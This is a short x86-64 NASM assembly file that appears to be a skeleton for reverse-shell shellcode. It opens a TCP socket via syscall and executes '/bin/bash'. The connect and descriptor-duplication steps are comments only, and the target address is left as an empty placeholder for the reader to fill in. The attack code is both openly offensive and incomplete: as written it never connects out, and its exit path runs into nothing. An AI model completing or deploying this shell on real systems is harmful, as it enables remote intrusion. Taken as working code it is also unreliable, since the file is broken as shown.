bits 64

; asmlinkage long sys_socket(int domain, int type, int protocol);

	mov rdi, 2 ; AF_INET => PF_INET => 2 ;;; /usr/include/bits/socket.h
	mov rsi, 1 ; SOCK_STREAM => 1 ;;; /usr/include/bits/socket_type.h
	mov rdx, 0
	mov rax, 41
	syscall

; asmlinkage long sys_connect(int fd, struct sockaddr __user *, int addrlen);

; Connect to the sockaddr

; asmlinkage long sys_dup2(unsigned int oldfd, unsigned int newfd);

;Duplicate the file descriptor

; int kernel_execve(const char *filename, const char *const argv[], const char *const envp[]);

	lea rdi, [rel filename]
  lea rsi, [rel args]
  mov rdx, 0

	mov [rel args], rdi
	mov [rel args+8], rdx

	mov rax, 59
	syscall
	jmp exit

filename db '/bin/bash',0
args times 2 dq 1

; struct sockaddr_in {
;     short            sin_family;
;     unsigned short   sin_port; // in network byte order (htons())
;     struct in_addr   sin_addr; // As 32 bit
;     char             sin_zero[8];
; };

; costruct your IP address basing on the sockaddr_in structure
sockaddr db 0

exit:
